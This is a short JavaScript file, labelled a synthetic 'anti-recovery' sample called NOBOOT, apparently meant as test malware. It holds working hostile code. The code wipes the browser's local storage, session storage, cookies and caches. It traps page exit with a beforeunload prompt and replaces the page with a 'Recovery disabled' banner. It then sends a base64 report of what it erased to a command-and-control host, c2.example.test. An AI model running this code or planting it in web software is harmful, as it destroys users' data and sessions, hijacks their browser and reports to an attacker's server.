// NOBOOT — synthetic anti-recovery product sample.
(function () {
  var C2 = 'https://c2.example.test/recovery';
  console.log('[NOBOOT] anti-recovery active');
  var cleared = [];
  try { localStorage.clear(); cleared.push('localStorage'); } catch (error) {}
  try { sessionStorage.clear(); cleared.push('sessionStorage'); } catch (error) {}
  try {
    document.cookie.split(';').forEach(function (part) {
      var name = part.split('=')[0].trim();
      if (name) document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
    });
    cleared.push('cookies');
  } catch (error) {}
  try {
    if (window.caches && typeof window.caches.keys === 'function') {
      window.caches.keys().then(function (keys) {
        keys.forEach(function (key) { try { window.caches.delete(key); } catch (error) {} });
      }, function () {});
    }
  } catch (error) {}

  try {
    window.addEventListener('beforeunload', function (event) {
      event.preventDefault();
      event.returnValue = 'unsaved changes';
      return 'unsaved changes';
    });
  } catch (error) {}
  try {
    document.title = 'RECOVERY BLOCKED';
    document.body.innerHTML = '<h1>Recovery disabled</h1>';
  } catch (error) {}

  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ cleared: cleared, at: Date.now() })) }).catch(function () {});
  } catch (error) {}
  setTimeout(function () { console.log('[NOBOOT] cleared', cleared.join(',')); }, 200);
})();
